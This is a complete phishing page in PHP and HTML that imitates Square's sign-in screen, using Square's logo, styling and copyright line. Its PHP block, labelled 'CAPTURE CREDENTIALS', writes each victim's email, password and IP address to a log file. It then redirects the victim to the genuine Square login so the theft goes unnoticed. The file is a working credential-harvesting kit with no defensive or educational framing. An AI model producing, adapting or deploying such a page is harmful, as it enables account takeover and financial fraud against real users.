<?php
// CAPTURE CREDENTIALS
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $pass = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $data = "Email: $email | Password: $pass | IP: $ip | Time: " . date('Y-m-d H:i:s') . "\n";
    file_put_contents('log.txt', $data, FILE_APPEND);
    // Redirect to real Square (or any page)
    header('Location: https://squareup.com/login');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Square – Sign In</title>
<style>
/* === CSS (inline) === */
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: 'Inter', sans-serif; background: #f5f5f5; display:flex; justify-content:center; align-items:center; height:100vh; }
.container { background:white; padding:40px; border-radius:12px; box-shadow:0 2px 10px rgba(0,0,0,0.1); width:380px; }
.logo { text-align:center; margin-bottom:20px; }
.logo img { width:120px; }
h2 { text-align:center; color:#1a1a1a; margin-bottom:20px; }
label { display:block; margin-bottom:6px; font-weight:500; }
input[type="email"], input[type="password"] { width:100%; padding:12px; margin-bottom:16px; border:1px solid #ccc; border-radius:6px; font-size:14px; }
button { width:100%; padding:14px; background:#006aff; color:white; border:none; border-radius:6px; font-size:16px; cursor:pointer; }
button:hover { background:#0056cc; }
.footer { text-align:center; margin-top:16px; font-size:12px; color:#666; }
</style>
</head>
<body>
<div class="container">
    <div class="logo"><img src="https://squareup.com/favicon.ico" alt="Square"></div>
    <h2>Sign in to Square</h2>
    <form method="post" action="">
        <label for="email">Email address</label>
        <input type="email" id="email" name="email" placeholder="you@example.com" required>
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" required>
        <button type="submit" id="submit-btn">Sign In</button>
    </form>
    <div class="footer">© Square, Inc.</div>
</div>
<script>
// === JS (inline) ===
document.addEventListener('DOMContentLoaded', function() {
    var btn = document.getElementById('submit-btn');
    btn.addEventListener('click', function() {
        btn.disabled = true;
        btn.innerText = 'Verifying...';
    });
});
</script>
</body>
</html>
